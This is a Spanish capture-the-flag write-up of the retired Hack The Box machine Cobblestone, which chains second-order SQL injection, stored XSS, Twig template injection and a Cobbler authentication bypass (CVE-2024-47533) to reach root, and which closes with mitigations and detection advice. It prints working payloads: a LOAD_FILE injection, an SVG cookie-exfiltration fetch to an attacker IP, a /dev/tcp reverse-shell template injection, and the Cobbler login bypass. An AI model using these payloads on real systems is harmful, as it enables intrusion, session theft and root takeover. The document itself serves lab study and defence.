---
machine: Cobblestone
os: Linux
difficulty: Insane
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, sqli, second-order, xss, twig, ssti, cobbler, cve-2024-47533]
---

# Cobblestone — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired, writeup publicable.
> Ficha de referencia de una máquina retirada. Sin flags ni credenciales reales.

## TL;DR

Debian 12 con dos vhosts. Una **SQLi de segundo orden** en la votación permite `LOAD_FILE` y leer la configuración de Apache, que revela el proxy interno a **Cobbler** en `127.0.0.1:25151`. Un **XSS almacenado** ejecuta código en el navegador del administrador y hay que **usar** la sesión, no robarla (la cookie es `HttpOnly`), el panel de despliegues renderiza **Twig** con la descripción del despliegue (**SSTI**) y da shell; la base de datos entrega el hash de `cobble` para SSH; y **CVE-2024-47533** cierra como root: bypass de autenticación de Cobbler más plantilla **Cheetah** en el `autoinstall`.

## Reconocimiento

```bash
nmap -p- --min-rate 10000 -sV -sC <IP> -oN nmap.txt
# 22, 80 y 443
ffuf -u http://<IP> -H "Host: FUZZ.cobblestone.htb" -w subdomains.txt -mc 200,403
```

```text
vote.cobblestone.htb     (app de votaciones)
deploy.cobblestone.htb   (panel de despliegues)
```

## Enumeración

`vote` es una web de votación con comentarios; `deploy` es una página de equipo detrás del login. Sin credenciales, el único punto de entrada es la votación: el comentario se guarda y se reutiliza después en la consulta de moderación del administrador (SQLi de segundo orden).

## Foothold

### 1. SQLi de segundo orden y lectura del fichero

El comentario `x', (SELECT LOAD_FILE('/etc/apache2/sites-enabled/000-default.conf'))) -- -` se guarda limplo y explota cuando el admin abre la moderación, que inserta el comentario en su consulta. El `LOAD_FILE` devuelve el `<VirtualHost>` con los `DocumentRoot` y, sobre todo:

```text
ProxyPass "/cobbler_api" "http://127.0.0.1:25151/"
```

Un servidor de aprovisionamiento **Cobbler** escuchando solo en localhost.

### 2. XSS almacenado y sesión de admin

El saneado se salta con un SVG en otro campo:

```html
<svg/onload=fetch('http://<IP>:8000/'+document.cookie)>
```

La cookie es **`HttpOnly`**: `document.cookie` nunca la ve y el `fetch` a un servidor propio no sirve. La ruta que funciona es obligar al navegador del admin a cargar una página `phpinfo()` controlada y leer el `PHPSESSID` impreso en la propia respuesta. Con esa cookie se entra en `deploy`.

### 3. Twig SSTI

El panel renderiza como plantilla Twig la **descripción del despliegue**; el nombre de usuario en la gestión de usuarios es la variante que documentan otros writeups:

```text
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("bash -c 'bash -i >& /dev/tcp/<IP>/4444 0>&1'")}}
```

```bash
nc -lvnp 4444
# www-deploy@cobblestone:~$
```

## Movimiento lateral

La base de datos de la aplicación guarda el hash de `cobble` y los writeups discrepan en el algoritmo (bcrypt en unos, SHA-256 filtrado por el SSTI en otros). El valor se reutiliza por SSH:

```bash
hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt
ssh cobble@cobblestone.htb
```

## Escalada de privilegios

Cobbler no es alcanzable desde fuera, pero sí desde la sesión SSH:

```bash
ssh -N -L 25151:127.0.0.1:25151 cobble@cobblestone.htb
curl -s -H 'Content-Type: text/xml' \
  -d '<?xml version="1.0"?><methodCall><methodName>version</methodName><params/></methodCall>' \
  http://127.0.0.1:25151/cobbler_api
# 3.3.6
```

**CVE-2024-47533** (Cobbler >= 3.0.0, < 3.2.3 y >= 3.3.0, < 3.3.7): `utils.get_shared_secret()` siempre devuelve `-1`, así que el login con usuario vacío y contraseña `-1` es válido. Con el token de administrador se crea una distro/perfil y se ejecuta un comando como root:

```python
import xmlrpc.client
srv = xmlrpc.client.ServerProxy("http://127.0.0.1:25151/cobbler_api", allow_none=True)
tok = srv.login("", -1)
# con el token: escribir una plantilla Cheetah de autoinstall y disparar la generación del perfil
```

## Evidencia

```text
/home/cobble/user.txt  -> <user_flag>
/root/root.txt         -> <root_flag>
```

## Lecciones aprendidas

- **SQLi de segundo orden**: el payload se guarda limpio y explota al releerlo; los WAF que solo miran la petición de entrada no lo ven.
- `LOAD_FILE` sigue disponible si el usuario de BD tiene `FILE`: la configuración de Apache es un mapa de la red interna.
- **SSTI** en un campo que parece cosmético (el nombre de un usuario) es RCE.
- **CVE-2024-47533 es un bypass de autenticación**, no una inyección de comandos: se entra con `""`/`-1` y se usan las APIs legítimas de Cobbler; el código se ejecuta al renderizar la plantilla **Cheetah** del `autoinstall` durante la generación del perfil.
- Mitigación: consultas preparadas, `FILE` revocado, plantillas sin `registerUndefinedFilterCallback`, Cobbler parcheado y `cobblerd` con autenticación real.

## Mitigaciones y detección

- Consultas parametrizadas en todas las lecturas, incluidas las de moderación.
- Revocar `FILE` al usuario de la base de datos y no publicar la configuración de Apache por esa vía.
- Sandbox de Twig y allowlist de campos editables; nunca renderizar texto del usuario.
- Cobbler >= 3.2.3 / 3.3.7 y API sin exponer por proxy.
- Detección: comentarios con `LOAD_FILE`/`UNION`, sesiones de admin usadas desde otra IP, peticiones a `/cobbler_api` y logins con usuario vacío.

## Referencias

- [CVE-2024-47533](https://nvd.nist.gov/vuln/detail/CVE-2024-47533)
- [ssti](../../../knowledge/web/ssti.md)
